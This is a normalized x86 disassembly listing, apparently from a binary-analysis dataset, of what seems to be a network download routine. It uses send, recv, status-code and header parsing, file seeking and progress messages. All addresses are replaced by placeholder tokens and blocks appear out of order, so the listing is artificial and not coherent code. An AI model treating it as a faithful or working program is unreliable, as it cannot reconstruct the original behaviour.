lea edx [ eax + 0x1 ]
mov ecx 0xf
xor esi esi
mov [ esp + 0x5c ] ecx
mov [ esp + 0x58 ] esi
mov [ esp + 0x48 ] 0x0
mov eax [ ebx + 0x24 ]
cmp eax 0x1
mov [ esp + 0x1b2c ] 0x1
jne r-xdata
mov eax [ esp + 0x34 ]
cmp eax [ ebx + 0x24 ]
jne r-xdata
mov ecx rw-data
call sub_404310
dec edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
mov [ ebx + 0xa8 ] eax
mov eax r--data
lea edx [ eax + 0x1 ]
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x1b2c ] 0x0
mov [ esp + 0x5c ] ecx
mov [ esp + 0x58 ] esi
mov [ esp + 0x48 ] 0x0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401e80
mov [ ebx + 0x28 ] 0x4
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebx + 0xd8 ]
inc [ ebx + 0xb4 ]
jmp r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401e80
mov [ ebx + 0x28 ] 0x6
lea eax [ esp + 0x520 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x524 ]
push ecx
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
lea eax [ esp + 0x320 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x324 ]
push edx
lea ecx [ esp + 0x4c ]
call sub_401cc0
cmp [ esp + 0x14 ] 0x50
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov al [ rw-data ]
test al al
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
lea eax [ esp + 0xf4 ]
lea edx [ eax + 0x1 ]
cmp [ rw-data ] esi
jle r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xf8 ]
push eax
lea ecx [ esp + 0x4c ]
call sub_401cc0
cmp [ rw-data ] esi
jg r-xdata
push rw-data
call [ lstrlenA@IAT ]
mov edi eax
push edi
lea ecx [ esp + 0x1a4 ]
push ecx
push rw-data
call sub_4a94f0
lea ecx [ edi + 0x2 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add esp 0xc
add edx eax
mov eax r--data
mov [ esp + edx * 4 + 0x1a0 ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax rw-data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
lea eax [ esp + 0x1a0 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax esi
mov ecx [ ebx + 0x60 ]
jl r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x1a4 ]
push ecx
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
push 0xffffffff
push esi
lea edx [ ebx + 0x8 ]
push edx
lea ecx [ esp + 0x50 ]
call sub_4018c0
mov cl [ esp + 0x13 ]
test cl cl
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
jg r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
cmp eax 0x2
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
push eax
push ecx
lea eax [ esp + 0x228 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x230 ]
add esp 0x10
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp ecx esi
jbe r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax rw-data
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov edx [ esp + 0x58 ]
mov eax r--data
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x3c ] esi
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] esi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x224 ]
push ecx
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea ecx [ esp + 0x4c ]
call sub_401cc0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push esi
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
cmp eax esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x4c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
push ebx
push esi
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push 0xffffffff
push esi
lea eax [ esp + 0x4c ]
push eax
mov ecx edi
call sub_4018c0
mov eax [ ebx + 0xec ]
mov ecx [ edi + 0x14 ]
add eax 0xfffffffe
cmp eax ecx
ja r-xdata
sub eax ecx
push esi
push eax
mov ecx edi
call sub_4017f0
push 0xffffffff
push eax
mov ecx edi
call sub_401ba0
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx [ esp + 0x58 ]
push 0x0
sub edx eax
push edx
add eax ecx
push eax
push edi
call [ send@IAT ]
lea ecx [ esp + 0x174 ]
mov edi eax
call sub_404410
cmp edi 0xffffffff
je r-xdata
lea ecx [ esp + 0x48 ]
mov [ esp + 0x13 ] 0x0
mov esi 0x10
lea esp [ esp ]
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
mov [ ebx + 0xa8 ] eax
call sub_402010
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ ebx + 0x40 ]
mov eax edi
mov edi [ ebx + 0x44 ]
cdq
add ecx eax
mov eax [ ebx + 0x3c ]
adc edi edx
mov [ ebx + 0x40 ] ecx
mov ecx edi
cmp eax ecx
mov [ ebx + 0x44 ] edi
jl r-xdata
inc [ ebx + 0xb4 ]
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov edx [ ebx + 0x3c ]
cmp edx [ ebx + 0x44 ]
jl r-xdata
jg r-xdata
mov eax [ ebx + 0x24 ]
cmp eax 0x1
lea ecx [ esp + 0x44 ]
jne r-xdata
jg r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx [ ebx + 0x40 ]
jbe r-xdata
cmp eax 0x2
jne r-xdata
push r--data
call sub_402510
mov [ ebx + 0x28 ] 0x5
jmp r-xdata
mov ecx [ esp + 0x34 ]
cmp ecx [ ebx + 0x24 ]
mov [ esp + 0x1b2c ] 0x0
lea ecx [ esp + 0x44 ]
jne r-xdata
mov eax [ ebx + 0x38 ]
cmp eax [ ebx + 0x40 ]
jbe r-xdata
mov edi [ ebx + 0x4 ]
push rw-data
lea ecx [ esp + 0x178 ]
call sub_4014e0
cmp [ esp + 0x5c ] esi
mov ecx [ esp + 0x48 ]
jae r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov [ esp + 0x1b2c ] 0x0
call sub_4480e0
jmp r-xdata
push r--data
call sub_402510
mov [ ebx + 0x28 ] 0x7
xor esi esi
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
mov [ ebx + 0x30 ] esi
mov [ ebx + 0x34 ] esi
mov [ ebx + 0x48 ] esi
mov [ ebx + 0x4c ] esi
call sub_402010
push esi
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
cmp eax esi
je r-xdata
call sub_4480e0
call sub_4480e0
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor eax eax
xor ecx ecx
mov [ esp + 0x94 ] eax
mov [ esp + 0x88 ] eax
mov [ esp + 0x8c ] eax
mov [ esp + 0x90 ] eax
mov eax [ ebx + 0x48 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x30 ] ecx
lea edx [ esp + eax + 0xb20 ]
mov edi 0x1000
push rw-data
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x3c ] edx
sub edi eax
call sub_4014e0
mov eax [ esp + 0x38 ]
push 0x0
push edi
push eax
push esi
call [ recv@IAT ]
mov edi eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0x24 ] edi
call sub_404410
cmp edi 0xffffffff
je r-xdata
push ebx
push esi
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
mov [ ebx + 0xa8 ] eax
test edi edi
je r-xdata
mov [ esp + 0x1b2c ] 0x0
lea ecx [ esp + 0x44 ]
mov eax [ ebx + 0xa4 ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax edi
cdq
mov [ esp + 0x98 ] eax
mov [ esp + 0x9c ] edx
cmp eax 0x1
lea esi [ ebx + 0xd8 ]
mov ecx esi
jne r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov eax [ esp + 0x18 ]
cdq
cmp edx esi
jg r-xdata
jl r-xdata
push r--data
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
push r--data
call sub_402010
mov edi [ esp + 0x20 ]
mov dl [ esp + edi + 0xb1e ]
lea eax [ esp + 0xb20 ]
push eax
mov ecx esi
mov [ esp + 0x23 ] dl
mov [ esp + edi + 0xb22 ] 0x0
call sub_402010
mov cl [ esp + 0x1f ]
lea eax [ edi - 0x2 ]
cdq
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x30 ] eax
mov eax [ ebx + 0xa8 ]
cmp eax 0xc8
mov [ esp + edi + 0xb1e ] cl
mov [ ebx + 0x4c ] edx
mov [ ebx + 0x34 ] edx
jb r-xdata
lea esi [ ebx + 0xd8 ]
push r--data
mov ecx esi
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
test eax eax
jg r-xdata
jl r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + ecx + 0xb20 ]
cmp al 0xa
je r-xdata
cmp eax edi
jae r-xdata
mov eax [ ebx + 0xb4 ]
inc eax
lea ecx [ esp + 0x44 ]
mov [ ebx + 0xb4 ] eax
mov [ esp + 0x1b2c ] 0x0
call sub_4480e0
jmp r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
push r--data
mov ecx esi
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x12c
jae r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ ebx + 0x48 ]
cdq
add ecx eax
mov eax [ ebx + 0x4c ]
adc eax edx
mov [ ebx + 0x48 ] ecx
mov [ ebx + 0x4c ] eax
jl r-xdata
mov esi [ esp + 0x18 ]
sub esi ecx
cmp esi 0xc
lea edi [ esp + ecx + 0xb20 ]
mov [ esp + 0x14 ] esi
jl r-xdata
cmp eax edi
jae r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0xd0 ]
cmp ecx eax
mov ecx eax
jne r-xdata
cmp al 0xd
jne r-xdata
cmp edx esi
jl r-xdata
nop
mov al [ esp + 0x13 ]
test al al
jmp r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
push r--data
mov ecx esi
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ esp + 0x24 ]
add ecx eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x34 ]
cmp ecx eax
jne r-xdata
mov ecx [ esp + 0x98 ]
mov edx [ ebx + 0x48 ]
add edx ecx
mov ecx [ ebx + 0x4c ]
mov [ ebx + 0x48 ] edx
mov edx [ esp + 0x9c ]
adc ecx edx
mov eax ecx
test eax eax
mov [ ebx + 0x4c ] ecx
jg r-xdata
cmp [ ebx + 0x48 ] 0x1000
jae r-xdata
cmp esi 0xe
jl r-xdata
mov cl [ edi + 0x8 ]
push r--data
push edi
mov [ esp + 0x1a ] cl
mov [ edi + 0x8 ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xb8 ]
mov edx [ esp + 0xbc ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x98 ]
mov edi [ ebx + 0x48 ]
mov edx [ esp + 0x9c ]
inc eax
add edi ecx
mov ecx [ ebx + 0x4c ]
adc ecx edx
sub edi 0x1
mov [ esp + 0x18 ] eax
cdq
sbb ecx 0x0
cmp edx ecx
jl r-xdata
mov edx ecx
cmp [ esp + edx + 0xb21 ] 0xa
je r-xdata
mov eax [ esp + 0x18 ]
cmp [ esp + eax + 0xb20 ] 0xd
jne r-xdata
jg r-xdata
lea ecx [ esp + 0x44 ]
mov [ esp + 0x1b2c ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x2
mov [ ebx + 0xa4 ] 0x0
jne r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov [ esp + 0x20 ] 0xffd
mov [ ebx + 0xa4 ] 0x2
jmp r-xdata
jl r-xdata
jmp r-xdata
cmp esi 0x10
jl r-xdata
mov dl [ edi + 0xd ]
push r--data
push edi
mov [ esp + 0x1a ] dl
mov [ edi + 0xd ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
movsx eax [ edi + 0x9 ]
sub eax 0x30
lea edx [ eax + eax * 4 ]
movsx eax [ edi + 0xa ]
lea eax [ eax + edx * 2 - 0x30 ]
movsx edx [ edi + 0xb ]
lea ecx [ eax + eax * 4 ]
lea eax [ edx + ecx * 2 - 0x30 ]
mov [ ebx + 0xa4 ] 0x1
mov [ ebx + 0xa8 ] eax
push r--data
push edi
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
jg r-xdata
inc eax
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
inc eax
cmp eax edi
jb r-xdata
inc [ ebx + 0xb4 ]
call sub_4480e0
jmp r-xdata
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
mov eax [ esp + 0x88 ]
mov ecx [ esp + 0x8c ]
mov edi [ esp + 0x28 ]
lea edx [ ebx + 0x90 ]
mov [ edx ] eax
mov eax [ esp + 0x90 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esp + 0x94 ]
mov [ edx + 0x8 ] eax
mov eax [ esp + 0x2c ]
mov [ edx + 0xc ] ecx
mov edx [ ebx + 0x60 ]
mov [ ebx + 0x8c ] eax
mov [ ebx + 0x34 ] eax
mov eax [ ebx + 0x64 ]
mov [ ebx + 0x88 ] edi
mov [ ebx + 0x30 ] edi
mov [ ebx + 0x48 ] edx
mov [ ebx + 0x4c ] eax
call [ GetTickCount@IAT ]
mov ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov [ ebx + 0x58 ] ecx
push r--data
mov ecx esi
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x54 ] eax
mov [ ebx + 0x5c ] edx
mov [ ebx + 0x28 ] 0x8
call sub_402010
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
cmp [ ebx + 0x48 ] 0x1000
jae r-xdata
cmp esi 0x28
jl r-xdata
mov eax [ esp + 0x28 ]
or eax [ esp + 0x2c ]
jne r-xdata
mov dl [ esp + 0x12 ]
mov [ edi + 0xd ] dl
lea eax [ esi - 0xe ]
push eax
lea ecx [ edi + 0xe ]
push ecx
lea ecx [ ebx + 0x68 ]
call sub_401e80
mov cl [ esp + 0x12 ]
mov [ edi + 0x8 ] cl
cmp eax edi
jb r-xdata
mov ecx [ esp + 0x88 ]
mov edx [ esp + 0x8c ]
lea eax [ ebx + 0x90 ]
mov [ eax ] ecx
mov ecx [ esp + 0x90 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x94 ]
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x2c ]
mov [ eax + 0xc ] edx
mov eax [ esp + 0x28 ]
mov [ esp + 0x60 ] 0xd
mov [ ebx + 0x88 ] eax
mov [ ebx + 0x8c ] ecx
jmp r-xdata
mov eax [ ebx + 0xcc ]
mov ecx [ esp + 0x2c ]
xor esi esi
cmp eax esi
mov eax edi
jne r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov eax [ ebx + 0x48 ]
mov edi [ ebx + 0x4 ]
lea ecx [ esp + eax + 0xb20 ]
mov [ esp + 0x38 ] ecx
mov esi 0x1000
push rw-data
lea ecx [ esp + 0xc8 ]
sub esi eax
call sub_4014e0
mov edx [ esp + 0x38 ]
push 0x0
push esi
push edx
push edi
call [ recv@IAT ]
mov esi eax
lea ecx [ esp + 0xc4 ]
mov [ esp + 0x24 ] esi
call sub_404410
cmp esi 0xffffffff
je r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
cmp esi 0xa
jl r-xdata
mov al [ edi + 0xe ]
push r--data
push edi
mov [ esp + 0x1a ] al
mov [ edi + 0xe ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
cmp esi 0x10
jl r-xdata
mov cl [ edi + 0xf ]
push r--data
push edi
mov [ esp + 0x1a ] cl
mov [ edi + 0xf ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
or eax ecx
jne r-xdata
or eax ecx
jne r-xdata
mov edi esi
jmp r-xdata
cmp esi 0x13
jl r-xdata
mov dl [ edi + 0x9 ]
push r--data
push edi
mov [ esp + 0x1a ] dl
mov [ edi + 0x9 ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov cl [ esp + 0x12 ]
mov [ edi + 0xe ] cl
mov cl [ edi + 0xf ]
mov dl [ edi + 0x10 ]
mov al [ edi + 0x11 ]
mov [ esp + 0x78 ] cl
mov [ esp + 0x79 ] dl
mov [ esp + 0x7a ] al
mov [ esp + 0x7b ] 0x0
mov [ esp + 0xfc ] r--data
mov [ esp + 0x100 ] r--data
mov [ esp + 0x104 ] r--data
mov [ esp + 0x108 ] r--data
mov [ esp + 0x10c ] r--data
mov [ esp + 0x110 ] r--data
mov [ esp + 0x114 ] r--data
xor esi esi
nop
mov cl [ edi + 0xe ]
push r--data
push edi
mov [ esp + 0x1a ] cl
mov [ edi + 0xe ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x12 ]
mov esi [ esp + 0x14 ]
mov [ edi + 0xf ] al
mov eax [ esp + 0x14 ]
lea edx [ eax - 0x10 ]
test edx edx
jle r-xdata
cmp [ ebx + 0xd4 ] esi
jne r-xdata
mov edi 0x7d000000
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] esi
mov eax [ ebx + 0xd4 ]
cmp eax esi
je r-xdata
mov edi 0x100000
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] esi
mov ecx [ esp + 0x18 ]
cmp [ esp + ecx + 0xb20 ] 0xd
jne r-xdata
mov dl [ edi + 0x12 ]
push r--data
push edi
mov [ esp + 0x27 ] dl
mov [ edi + 0x12 ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov cl [ esp + 0x12 ]
mov [ edi + 0x9 ] cl
lea eax [ esi - 0xa ]
cmp eax 0x100
jge r-xdata
mov al [ edi + 0x14 ]
mov cl [ edi + 0x15 ]
lea edx [ esp + 0x6c ]
push edx
mov [ esp + 0x70 ] al
mov [ esp + 0x71 ] cl
mov [ esp + 0x72 ] 0x0
call j_sub_4b692d
mov cl [ edi + 0x18 ]
mov dl [ edi + 0x19 ]
mov [ esp + 0x92 ] ax
mov al [ edi + 0x17 ]
add esp 0x4
mov [ esp + 0x7c ] al
mov [ esp + 0x7d ] cl
mov [ esp + 0x7e ] dl
mov [ esp + 0x7f ] 0x0
mov [ esp + 0x118 ] r--data
mov [ esp + 0x11c ] r--data
mov [ esp + 0x120 ] r--data
mov [ esp + 0x124 ] r--data
mov [ esp + 0x128 ] r--data
mov [ esp + 0x12c ] r--data
mov [ esp + 0x130 ] r--data
mov [ esp + 0x134 ] r--data
mov [ esp + 0x138 ] r--data
mov [ esp + 0x13c ] r--data
mov [ esp + 0x140 ] r--data
mov [ esp + 0x144 ] r--data
xor esi esi
jmp r-xdata
inc esi
cmp esi 0x7
jl r-xdata
mov dl [ esp + 0x12 ]
mov esi [ esp + 0x14 ]
mov [ edi + 0xe ] dl
or edx 0xffffffff
mov [ esp + 0xa0 ] edx
mov [ esp + 0xa4 ] edx
mov [ esp + 0xa8 ] edx
mov [ esp + 0xac ] edx
lea esi [ edi + 0xf ]
mov [ esp + 0x38 ] eax
lea ebx [ ebx ]
mov [ ebx + 0xa4 ] 0x2
add eax 0xfffffff1
cmp eax 0x10
jg r-xdata
cmp [ ebx + 0x64 ] esi
mov ecx 0x2
jl r-xdata
mov ecx [ rw-data ]
push ecx
push esi
call [ LocalAlloc@IAT ]
cmp eax esi
mov [ ebx + 0xd4 ] eax
je r-xdata
lea edx [ edi + 0x100 ]
push edx
push esi
call [ LocalAlloc@IAT ]
mov [ ebx + 0xd4 ] eax
jmp r-xdata
push esi
lea ecx [ edi + 0x100 ]
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov [ ebx + 0xd4 ] eax
jmp r-xdata
inc ecx
mov [ esp + 0x14 ] ecx
jmp r-xdata
inc ecx
mov al [ esp + 0x1f ]
mov [ edi + 0x12 ] al
cmp esi 0x1a
jne r-xdata
mov eax [ ebx + 0xa8 ]
cmp eax 0x12c
jb r-xdata
mov eax [ esp + esi * 4 + 0x118 ]
push eax
lea ecx [ esp + 0x80 ]
push ecx
call [ lstrcmpiA@IAT ]
inc esi
test eax eax
je r-xdata
mov ecx [ esp + esi * 4 + 0xfc ]
push ecx
lea edx [ esp + 0x7c ]
push edx
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x30
mov ecx esi
jl r-xdata
cmp al 0x30
jl r-xdata
push eax
lea eax [ edi + 0x10 ]
push eax
lea ecx [ esp + 0x150 ]
push ecx
call [ lstrcpynA@IAT ]
lea edx [ esp + 0x148 ]
push edx
call sub_4add10
mov esi edx
add esp 0x4
test esi esi
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] esi
jl r-xdata
mov edx [ esp + 0x64 ]
cmp edx 0xffffffff
jne r-xdata
jg r-xdata
mov eax [ ebx + 0xd4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x98 ]
mov edi [ ebx + 0x48 ]
mov eax [ esp + 0x9c ]
mov esi [ ebx + 0x4c ]
add edi edx
adc esi eax
sub edi 0x1
mov eax ecx
cdq
sbb esi 0x0
cmp edx esi
mov [ esp + 0x18 ] ecx
mov [ esp + 0xd0 ] edi
mov [ esp + 0xb8 ] eax
mov [ esp + 0xbc ] edx
jg r-xdata
mov [ ebx + 0xa4 ] 0xfffffffc
mov al [ edi + 0x1a ]
push r--data
lea ecx [ edi + 0x13 ]
push ecx
mov [ esp + 0x1a ] al
mov [ edi + 0x1a ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
cmp eax 0x190
jae r-xdata
mov [ esp + 0x8a ] si
cmp esi 0xc
jl r-xdata
mov eax esi
sub eax ecx
test eax eax
jle r-xdata
mov edi edi
mov al [ esi + 0x1 ]
inc esi
cmp al 0xd
jne r-xdata
cmp al 0x39
jle r-xdata
mov [ ebx + 0xa4 ] 0xfffffffc
jmp r-xdata
jg r-xdata
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x60 ]
push esi
mov [ esp + 0xf0 ] ecx
lea ecx [ esp + 0xf0 ]
push ecx
push eax
push edx
mov [ esp + 0xf8 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp [ ebx + 0xd0 ] 0x10
jb r-xdata
mov ecx 0x3
cmp [ ebx + 0x60 ] esi
jbe r-xdata
mov [ ebx + 0xa4 ] 0xffffffff
call [ GetLastError@IAT ]
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x24 ]
sub esi ecx
push eax
mov [ esp + 0x18 ] esi
call [ LocalSize@IAT ]
cmp esi eax
jle r-xdata
mov dl [ esp + 0x12 ]
mov [ ebx + 0xa4 ] 0xfffffffc
mov [ edi + 0x1a ] dl
jmp r-xdata
mov dl [ esp + 0x12 ]
mov [ esp + 0x30 ] 0x1
mov [ edi + 0x1a ] dl
jmp r-xdata
lea ecx [ esi - 0x9 ]
push ecx
lea edx [ edi + 0xa ]
push edx
lea eax [ esp + 0x728 ]
push eax
call [ lstrcpynA@IAT ]
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov eax [ esp + 0x38 ]
inc eax
cmp eax 0x3
mov [ esp + 0x38 ] eax
jl r-xdata
cmp eax 0x10
jge r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x30
jge r-xdata
mov eax [ rw-data ]
push 0x0
cdq
push 0x100000
push edx
push eax
call sub_4b6490
cmp esi edx
jl r-xdata
test eax eax
jbe r-xdata
mov esi [ GetLastError@IAT ]
call esi
test eax eax
jne r-xdata
lea eax [ ebx + 0xbc ]
mov eax [ ebx + 0xbc ]
jmp r-xdata
xor eax eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x38 ] eax
cmp [ esp + 0x30 ] 0x1
jne r-xdata
mov edx [ ebx + 0xd4 ]
push edx
call [ LocalSize@IAT ]
mov esi eax
mov [ esp + 0x14 ] esi
mov al [ edi + 0x1c ]
